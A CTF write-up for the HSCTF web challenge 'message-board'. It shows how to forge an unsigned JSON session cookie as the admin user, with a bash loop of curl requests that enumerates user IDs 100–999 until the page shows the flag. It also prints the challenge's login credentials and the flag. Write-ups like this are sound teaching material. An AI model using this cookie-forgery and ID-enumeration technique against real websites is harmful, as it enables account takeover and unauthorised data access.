# Injection(Web) - Writeup

## description

````
web/message-board
goose

Your employer, LameCompany, has lots of gossip on its company message board: message-board.hsc.tf. You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.

Your login credentials: username: kupatergent password: gandal

Server code is attached (slightly modified).
````


## answer

When you log in with the credentials in the problem statement, you will see the conversation screen.
![000-1](https://user-images.githubusercontent.com/45488828/122660831-7d88ad00-d1bf-11eb-8655-7ebbb667975f.jpg)
![001-1](https://user-images.githubusercontent.com/45488828/122660833-7feb0700-d1bf-11eb-9299-bdae4404086c.jpg)
![002-1](https://user-images.githubusercontent.com/45488828/122660885-fdaf1280-d1bf-11eb-8eef-fb6b2a234dc2.jpg)

The login ID and user name are managed by the coockie value, which seems to be rewritable.

userData = j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D

Rewrite username to admin and then search for userID.

````
┌──(root💀kali)-[~]
└─# for i in {100..999}; do
curl -H "Cookie:userData=j%3A%7B%22userID%22%3A%22$i%22%2C%22username%22%3A%22admin%22%7D" https://message-board.hsc.tf/ | grep flag{
done

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1819  100  1819    0     0   2229      0 --:--:-- --:--:-- --:--:--  2226
        <p><strong data-bs-toggle="tooltip" title="what a cool name">HSCTF:</strong> flag{y4m_y4m_c00k13s}</p>

````

###### flag{y4m_y4m_c00k13s}
